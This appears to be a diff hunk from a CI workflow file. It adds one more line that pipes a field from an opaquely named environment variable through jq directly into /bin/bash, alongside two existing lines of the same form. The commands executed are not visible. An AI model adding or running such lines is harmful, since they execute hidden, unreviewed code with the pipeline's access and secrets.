@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$ae2" | jq -r .c251 | /bin/bash
           printf '%s' "$wf250" | jq -r .akf5538 | /bin/bash
+          printf '%s' "$oyz3" | jq -r .tq089 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
